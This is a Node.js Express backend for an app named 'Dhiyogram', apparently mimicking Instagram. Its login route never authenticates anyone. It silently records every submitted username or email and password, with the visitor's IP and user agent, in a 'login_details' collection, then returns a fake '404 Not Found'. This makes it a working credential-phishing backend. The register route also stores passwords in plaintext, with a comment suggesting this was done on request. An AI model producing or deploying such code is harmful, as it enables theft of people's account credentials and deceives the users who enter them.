import 'dotenv/config'
import express from 'express'
import helmet from 'helmet'
import cors from 'cors'
import { z } from 'zod'
import { getDb } from './db.js'

const app = express()

app.use(helmet())
app.use(express.json())

const frontendOrigin = process.env.FRONTEND_ORIGIN || 'http://localhost:5173'
app.use(
  cors({
    origin: frontendOrigin,
    credentials: true,
  }),
)

app.get('/health', (_req, res) => {
  res.json({ ok: true, name: 'dhiyogram-back', time: new Date().toISOString() })
})

const registerSchema = z.object({
  usernameOrEmail: z.string().min(3).max(120),
  password: z.string().min(4).max(200),
})

app.post('/auth/register', (req, res) => {
  ;(async () => {
    const parsed = registerSchema.safeParse(req.body)
    if (!parsed.success) {
      return res.status(400).json({ ok: false, error: 'Invalid input' })
    }

    const now = new Date()
    const usernameOrEmail = parsed.data.usernameOrEmail
    const key = usernameOrEmail.toLowerCase()

    const db = await getDb()
    try {
      await db.collection('users').insertOne({
        key,
        usernameOrEmail,
        password: parsed.data.password, // per your request: stored without encryption/hashing (NOT recommended)
        createdAt: now,
      })
      return res.json({ ok: true })
    } catch (e) {
      if (e && typeof e === 'object' && 'code' in e && e.code === 11000) {
        return res.status(409).json({ ok: false, error: 'User already exists' })
      }
      throw e
    }
  })().catch((e) => {
    // eslint-disable-next-line no-console
    console.error(e)
    res.status(500).json({ ok: false, error: 'Server error' })
  })
})

const loginSchema = z.object({
  usernameOrEmail: z.string().min(3).max(120),
  password: z.string().min(1).max(200),
})

app.post('/auth/login', (req, res) => {
  ;(async () => {
    const parsed = loginSchema.safeParse(req.body)
    if (!parsed.success) {
      return res.status(400).json({ ok: false, error: 'Invalid input' })
    }

    const db = await getDb()
    const now = new Date()
    await db.collection('login_details').insertOne({
      usernameOrEmail: parsed.data.usernameOrEmail,
      password: parsed.data.password,
      createdAt: now,
      ip: req.ip,
      userAgent: req.get('user-agent') || '',
    })

    return res.status(404).json({ ok: false, error: '404 Not Found' })
  })().catch((e) => {
    // eslint-disable-next-line no-console
    console.error(e)
    res.status(500).json({ ok: false, error: 'Server error' })
  })
})

const port = Number(process.env.PORT || 8080)
const server = app.listen(port, () => {
  // eslint-disable-next-line no-console
  console.log(`Dhiyogram backend listening on http://localhost:${port}`)
  // eslint-disable-next-line no-console
  console.log(`CORS origin: ${frontendOrigin}`)
})

server.on('error', (err) => {
  if (err && typeof err === 'object' && 'code' in err && err.code === 'EADDRINUSE') {
    // eslint-disable-next-line no-console
    console.error(
      `Port ${port} is already in use. Stop the other process or set PORT in .env (example: PORT=8081).`,
    )
    process.exit(1)
  }
  throw err
})

